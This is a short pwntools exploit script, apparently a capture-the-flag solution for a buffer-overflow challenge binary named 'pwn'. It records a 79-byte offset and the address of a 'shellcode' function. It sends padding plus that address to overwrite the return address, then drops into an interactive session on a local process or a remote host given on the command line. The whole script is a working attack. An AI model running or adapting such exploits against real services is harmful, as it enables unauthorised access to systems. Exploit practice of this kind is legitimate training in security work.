# Offset is 79
# Statically linked
"""

$ objdump -D pwn -M intel | grep shellcode
00000000004017a5 <shellcode>:

"""

bd = 0x00000000004017A5
from pwn import *
import sys

context.log_level = "debug"


if len(sys.argv) == 1:
    r = process("./pwn")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b"A" * 79
r.recvuntil(b"Show me your name: ")
r.sendline(padding + p64(bd))
r.recvuntil(b"\x0a")
r.interactive()
